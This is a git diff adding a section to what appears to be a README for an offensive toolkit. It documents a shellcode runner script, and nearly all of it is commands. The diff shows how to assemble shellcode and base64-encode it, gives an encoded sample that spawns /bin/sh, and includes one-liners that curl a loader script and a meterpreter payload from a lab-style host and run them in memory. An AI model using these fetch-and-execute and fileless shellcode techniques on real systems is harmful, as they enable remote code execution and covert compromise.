@@ -14,3 +14,18 @@ but maybe something like this?
 ```bash
 python <(curl -s http://10.10.14.3/fileless.py) http://10.10.14.3/meterpreter
 ```
+
+## [shellcode.py](shellcode.py)
+Run shellcode from command line. First you need some base64-encoded shellcode:
+```bash
+nasm -f elf64 -o /tmp/shellcode.o shellcode.asm; ld -o /tmp/shellcode /tmp/shellcode.o; rm /tmp/shellcode.o
+printf $(objdump -d /tmp/shellcode | egrep '^ ' | cut -f2 | sed -r -e 's/([0-9,a-f]{2})/\\x\1/g' -e 's/ //g' | tr -d '\n') | base64 | tr -d '\n'; echo; rm /tmp/shellcode
+```
+now we can run it (this simply spawns `/bin/sh`):
+```
+python shellcode.py McBIu9GdlpHQjJf/SPfbU1RfmVJXVF6wOw8F
+```
+of course we could do some more interesting stuff with this, like for example:
+```
+python <(curl 10.10.14.3/shellcode.py) $(curl --output - 10.10.14.3/meterpreter.bin | base64 | tr -d '\n')
+```
